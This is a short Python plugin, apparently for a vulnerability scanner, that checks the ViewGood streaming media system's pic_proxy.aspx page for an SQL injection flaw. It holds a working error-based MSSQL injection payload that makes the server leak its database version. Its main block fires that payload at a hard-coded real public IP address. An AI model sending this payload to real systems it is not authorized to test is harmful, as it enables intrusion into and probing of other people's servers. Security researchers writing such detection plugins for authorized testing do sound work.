#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 烽火戏诸侯
#_PlugName_ = 远古流媒体系统  pic_proxy.aspx注入漏洞


def assign(service, arg):
    if service == "viewgood":
        return True, arg

def audit(arg):
    payload ='viewgood/webmedia/portal/pic_proxy.aspx?id=1%20and%201%3Dconvert%28int%2C%20CHAR%28116%29%20%2b%20CHAR%28121%29%20%2b%20CHAR%28113%29%2b@@version%2b%20CHAR%28116%29%20%2b%20CHAR%28121%29%20%2b%20CHAR%28113%29%29--&type=2'
    target = arg + payload 
    code, head, res, errcode, _ = curl.curl2(target)
    if code == 500 and 'tyqMicrosoft SQL Server' in res:
        security_hole(target)
           
        

if __name__ == '__main__':
    from dummy import *
    audit(assign('viewgood', 'http://116.236.137.30/')[1])